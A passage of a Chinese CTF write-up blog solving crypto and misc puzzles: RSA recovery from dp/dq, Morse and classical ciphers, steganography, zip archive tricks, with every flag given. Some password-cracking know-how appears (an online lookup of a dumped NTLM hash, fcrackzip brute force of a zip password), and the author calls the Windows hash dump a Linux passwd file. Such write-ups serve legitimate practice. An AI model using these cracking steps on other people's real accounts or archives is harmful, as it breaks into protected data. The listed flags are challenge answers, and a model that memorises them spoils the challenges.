class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">13040004482819947212936436796507286940525898188874967465457845309271472287032383337801279101</span><br><span class="line">666c61677b34396439313037376131616263623134663161396435343663383062653965667d</span><br><span class="line">b&apos;flag&#123;49d91077a1abcb14f1a9d546c80be9ef&#125;&apos;</span><br></pre></td></tr></table></figure><h3 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 </span><br><span class="line">q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 </span><br><span class="line">dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 </span><br><span class="line">dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 </span><br><span class="line">c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><br></pre></td></tr></table></figure><p>其中$dp\equiv d \bmod\varphi(p), dq\equiv d \bmod\varphi(q)$<br>这其实就是一个同余方程，用中国剩余定理合并即可<br>但是$p-1, q-1$不互质，在这里推导一下<br>令$dd=(p-1,q-1)$<br>$d=k_1(p-1)+dp=k_2(q-1)+dq$<br>$k_2(q-1)\equiv dp-dq\bmod {(p-1)}$<br>$k_2\frac{(q-1)}{dd}\equiv \frac{dp-dq}{dd}\bmod {\frac{(p-1)}{dd}}$<br>$k_2=k’\frac{(p-1)}{dd}+\frac{dp-dq}{dd}{(\frac{q-1}{dd})}^{-1}$<br>$d=k_2(q-1)+dq=(k’\frac{(p-1)}{dd}+\frac{dp-dq}{dd}{(\frac{q-1}{dd})}^{-1})(q-1)+dq$<br>这里直接$d=\frac{dp-dq}{dd}{(\frac{q-1}{dd})}^{-1}(q-1)+dq$就好咯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"></span><br><span class="line">p = gp.mpz(<span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span>)</span><br><span class="line">q = gp.mpz(<span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span>)</span><br><span class="line">dp = gp.mpz(<span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span>)</span><br><span class="line">dq = gp.mpz(<span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span>)</span><br><span class="line">c = gp.mpz(<span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span>)</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">phin = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">dd = gp.gcd(p<span class="number">-1</span>, q<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">d=(dp-dq)//dd * gp.invert((q<span class="number">-1</span>)//dd, (p<span class="number">-1</span>)//dd) * (q<span class="number">-1</span>) +dq</span><br><span class="line">print(d)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = gp.powmod(c, d, n)</span><br><span class="line">print(<span class="string">'-------------------'</span>)</span><br><span class="line">print(m)</span><br><span class="line">print(hex(m)[<span class="number">2</span>:])</span><br><span class="line">print(bytes.fromhex(hex(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">11630208090204506176302961171539022042721137807911818876637821759101</span><br><span class="line">6e6f784354467b57333163306d335f37305f4368316e343730776e7d</span><br><span class="line">b&apos;noxCTF&#123;W31c0m3_70_Ch1n470wn&#125;&apos;</span><br></pre></td></tr></table></figure></p><p>然鹅需要提交<code>flag{W31c0m3_70_Ch1n470wn}</code>才能成功，我已经反馈了，不知道有没有修改</p><h3 id="Windows系统密码"><a href="#Windows系统密码" class="headerlink" title="Windows系统密码"></a>Windows系统密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">ctf:1002:06af9108f2e1fecf144e2e8adef09efd:a7fcb22a88038f35a8f39d503e7f0062:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:bef14eee40dffbc345eeb3f58e290d56:::</span><br></pre></td></tr></table></figure><p>这一看就是Linux 的passwd文件啊…<br>然后我就随便去cmd5查了一下ctf的最后一项<code>a7fcb22a88038f35a8f39d503e7f0062</code><br><a href="https://www.cmd5.com/" target="_blank" rel="noopener">https://www.cmd5.com/</a><br>就得到了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">good-luck</span><br><span class="line">flag&#123;good-luck&#125;</span><br></pre></td></tr></table></figure></p><h3 id="robomunication"><a href="#robomunication" class="headerlink" title="robomunication"></a>robomunication</h3><p>一个mp3，下下来听一听…一堆bi bu，感觉就是莫斯电码，然后我就听着用bp分别记录下来，然后b替换成.p替换成-<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.... . .-.. .-.. --- .-- .... .- - .. ... - .... . -.- . -.-- .. - .. ... -... --- --- .--. -... . . .--.</span><br></pre></td></tr></table></figure></p><p><a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx" target="_blank" rel="noopener">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a><br>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HELLOWHATISTHEKEYITISBOOPBEEP</span><br></pre></td></tr></table></figure></p><p>再加点英语基础<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;BOOPBEEP&#125;</span><br></pre></td></tr></table></figure></p><h3 id="传统知识-古典密码"><a href="#传统知识-古典密码" class="headerlink" title="传统知识+古典密码"></a>传统知识+古典密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">小明某一天收到一封密信，信中写了几个不同的年份</span><br><span class="line">          辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳。</span><br><span class="line">          信的背面还写有“+甲子”，请解出这段密文。</span><br><span class="line"></span><br><span class="line">key值：CTF&#123;XXX&#125;</span><br></pre></td></tr></table></figure><p>依次对应得到<code>28, 30, 23, 8, 17, 10, 16, 30</code><br>60一甲子，全加60然后输出<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">28</span>,   <span class="number">30</span>,   <span class="number">23</span>,  <span class="number">8</span>,   <span class="number">17</span>,    <span class="number">10</span>,  <span class="number">16</span>,   <span class="number">30</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    print(chr(i+<span class="number">60</span>), end=<span class="string">''</span>)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure></p><p>得到<code>XZSDMFLZ</code><br>后面是我不会做的…用了两个古典密码加密…我就想知道这除了碰运气还能咋做..<br>先栅栏得到<code>XMZFSLDZ</code> 再恺撒<code>ROT21    SHUANGYU</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;SHUANGYU&#125;</span><br></pre></td></tr></table></figure></p><h3 id="old-fashion"><a href="#old-fashion" class="headerlink" title="old-fashion"></a>old-fashion</h3><p>题目一段文字<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Os drnuzearyuwn, y jtkjzoztzoes douwlr oj y ilzwex eq lsdexosa kn pwodw tsozj eq ufyoszlbz yrl rlufydlx pozw douwlrzlbz, ydderxosa ze y rlatfyr jnjzli; mjy gfbmw vla xy wbfnsy symmyew (mjy vrwm qrvvrf), hlbew rd symmyew, mebhsymw rd symmyew, vbomgeyw rd mjy lxrzy, lfk wr dremj. Mjy eyqybzye kyqbhjyew mjy myom xa hyedrevbfn lf bfzyewy wgxwmbmgmbrf. Wr mjy dsln bw f1_2jyf-k3_jg1-vb-vl_l</span><br></pre></td></tr></table></figure></p><p>观察一下ASCII码其实发现不了什么，已经提示了是古典密码，那么应该是个字母置换，而且不会去除空格。<br>恺撒什么的也都试过了，发现不了啥<br>因为这一段比较长，所以可以用词频分析来解密，最后一句话很像是flag…<br><a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a><br>第一个就得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?l fog?vryoe?sg, e h?dhv?v?v?rl f??sao ?h e ?avsrb rc alfrb?ly dg ?s?fs ?l?vh rc ?ne?lvaiv eoa oa?nefab ??vs f??saovaiv, effrob?ly vr e oay?neo hghva?; the units may be single letters (the most common), pairs of letters, triplets of letters, mi?tures of the above, and so forth. The receiver deciphers the te?t by performing an inverse substitution. So the flag is n1_2hen-d3_hu1-mi-ma_a</span><br></pre></td></tr></table></figure></p><p>所以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;n1_2hen-d3_hu1-mi-ma_a&#125;</span><br></pre></td></tr></table></figure></p><h3 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h3><p>感觉这题应该放在Misc…不知道为什么出现在这里<br>伪加密就是并没有加密，然后装作加密的样子，用<code>wxHexEditor</code>打开，然后将两个<br><code>50 4B 03 04 14 00 09 00</code>都修改成<code>50 4B 03 04 14 00 00 00</code>就ok了，解压得到<code>flag.txt</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Adm1N-B2G-kU-SZIP&#125;</span><br></pre></td></tr></table></figure></p><h3 id="Alice与Bob"><a href="#Alice与Bob" class="headerlink" title="Alice与Bob"></a>Alice与Bob</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密码学历史中，有两位知名的杰出人物，Alice和Bob。他们的爱情经过置换和轮加密也难以混淆，即使是没有身份认证也可以知根知底。就像在数学王国中的素数一样，孤傲又热情。下面是一个大整数:98554799767,请分解为两个素数，分解后，小的放前面，大的放后面，合成一个新的数字，进行md5的32位小写哈希，提交答案。 注意：得到的 flag 请包上 flag&#123;&#125; 提交</span><br></pre></td></tr></table></figure><p>直接用factordb查一下<br><a href="http://factordb.com/index.php?query=98554799767" target="_blank" rel="noopener">http://factordb.com/index.php?query=98554799767</a><br>然后md5加密<code>echo -n 101999966233 | md5sum</code>，得到<code>flag{d450209323a847c8d01c6be47c81811a}</code></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">签到题 flag&#123;buu_ctf&#125;</span><br></pre></td></tr></table></figure><h3 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h3><p>一个gif，可以看到有很快的东西闪过<br><img src="/img/ctf-buuctf/aaa.gif" alt="aaa.gif"><br>用<code>convert aaa.gif aaa.png</code>将gif按帧分解<br>得到三张包含flag的图片<br><img src="/img/ctf-buuctf/aaa-20.png" alt><br><img src="/img/ctf-buuctf/aaa-50.png" alt><br><img src="/img/ctf-buuctf/aaa-78.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;he11ohongke&#125;</span><br></pre></td></tr></table></figure></p><h3 id="来首歌吧"><a href="#来首歌吧" class="headerlink" title="来首歌吧"></a>来首歌吧</h3><p>一首歌，下下来一听，感觉十分耳熟…然后听着听着感觉左耳聋了…左声道没声音，然后一会开始滴滴滴了，一听就是莫斯电码的样子…<br>尝试用耳朵听…感觉听不过来…还是得用点工具<br>用Audacity打开<br>Audacity安装<br><a href="https://launchpad.net/~ubuntuhandbook1/+archive/ubuntu/audacity" target="_blank" rel="noopener">https://launchpad.net/~ubuntuhandbook1/+archive/ubuntu/audacity</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:ubuntuhandbook1/audacity</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install audacity</span><br></pre></td></tr></table></figure></p><p><img src="/img/ctf-buuctf/2019-06-02-16-17-58.png" alt="sc"><br>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-.</span><br></pre></td></tr></table></figure></p><p>然后翻译出莫斯电码<br><a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx" target="_blank" rel="noopener">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5BC925649CB0188F52E617D70929191C</span><br></pre></td></tr></table></figure></p><p>本来以为这个还被加密过，甚至查了一下md5，需要付费<br>没想到flag就是这个…<br><img src="/img/bqb/lengzhu.jpg" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5BC925649CB0188F52E617D70929191C&#125;</span><br></pre></td></tr></table></figure></p><h3 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h3><p><img src="/img/ctf-buuctf/QR_code.png" alt><br>扫一下得到<code>secret is here</code><br><img src="/img/bqb/lengzhu.jpg" alt><br>用binwalk检测一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">binwalk QR_code.png </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 280 x 280, 1-bit colormap, non-interlaced</span><br><span class="line">471           0x1D7           Zip archive data, encrypted at least v2.0 to extract, compressed size: 29, uncompressed size: 15, name: 4number.txt</span><br><span class="line">650           0x28A           End of Zip archive</span><br></pre></td></tr></table></figure></p><p>发现有个zip 然后<code>binwalk QR_code.png -e</code>把压缩包搞出来<br>然后发现压缩包加密了，里面有个文件叫4number.txt，也就提示了密码是4位数字，用fcrackzip来暴力破解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -b -c1 -u -l4 1D7.zip </span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == 7639</span><br></pre></td></tr></table></figure></p><p>解压以后得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;vjpw_wnoei&#125;</span><br></pre></td></tr></table></figure></p><p>需提交<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;vjpw_wnoei&#125;</span><br></pre></td></tr></table></figure></p><h3 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h3><p>一个压缩包和一张图片<br><img src="/img/ctf-buuctf/pic.jpg" alt><br>海伦凯勒用盲文写的这本书，所以底下自然是盲文咯<br><img src="/img/ctf-buuctf/mangwen.jpg" alt><br>对照一下得到<code>kmdonowg</code></p><p>用这个密码解压一下，发现解压不了…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">binwalk music.zip </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             RAR archive data, first volume type: MAIN_HEAD</span><br></pre></td></tr></table></figure></p><p>这其实是一个rar…<code>unrar e music.zip</code></p><p>得到<code>music.wav</code>，一听就是莫斯电码，用<code>audacity</code>打开<br><img src="/img/ctf-buuctf/2019-06-03-15-29-34.png" alt><br>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-.-. - ..-. .-- .--. . .. ----- ---.. --... ...-- ..--- ..--.. ..--- ...-- -.. --..</span><br></pre></td></tr></table></figure></p><p>解密一下，莫斯电码英文是没有大小写的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CTFWPEI08732?23DZ</span><br><span class="line">ctfwpei08732?23dz</span><br></pre></td></tr></table></figure></p><p>原题应该是提交<code>CTF{wpei08732?23dz}</code>这里就要提交<code>flag{wpei08732?23dz}</code></p><h3 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h3><p>KEY.exe显然是运行不了..<br>strings 查看一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings KEY.exe</span><br><span class="line">data:image/jpg;base64,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</span><br></pre></td></tr></table></figure><p>这是一个jpg转成了base64，还原回去就好了<br><a href="http://imgbase64.duoshitong.com/" target="_blank" rel="noopener">http://imgbase64.duoshitong.com/</a><br><img src="/img/ctf-buuctf/download" alt><br>或者直接把上面一段丢到浏览器地址栏里就可以显示了<br>扫一扫得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KEY&#123;dca57f966e4e4e31fd5b15417da63269&#125;</span><br></pre></td></tr></table></figure></p><p>提交<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dca57f966e4e4e31fd5b15417da63269&#125;</span><br></pre></td></tr></table></figure></p><h3 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h3><p>题目就一张图片<br><img src="/img/ctf-buuctf/steg.png" alt><br>用StegSolve查看一下，这就是一个LSB，查看RGB最后一位，发现只有前面一段有信息，3个合在一起查看就看到了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">4865792049207468 696e6b2077652063  Hey I th ink we c</span><br><span class="line">616e207772697465 20736166656c7920  an write  safely </span><br><span class="line">696e207468697320 66696c6520776974  in this  file wit</span><br><span class="line">686f757420616e79 6f6e652073656569  hout any one seei</span><br><span class="line">6e672069742e2041 6e797761792c2074  ng it. A nyway, t</span><br><span class="line">6865207365637265 74206b6579206973  he secre t key is</span><br><span class="line">3a2073743367305f 7361757275735f77  : st3g0_ saurus_w</span><br><span class="line">7233636b73000000 0000000000000000  r3cks... ........</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;st3g0_ saurus_wr3cks&#125;</span><br></pre></td></tr></table></figure></p><h3 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h3><p>题目一张图片<br><img src="/img/ctf-buuctf/biubiu.jpg" alt><br>用wxHexEditor查看一下，翻到最后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag IS flag&#123;stego_is_s0_bor1ing&#125;</span><br></pre></td></tr></table></figure></p><h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p><img src="/img/ctf-buuctf/flag11.png" 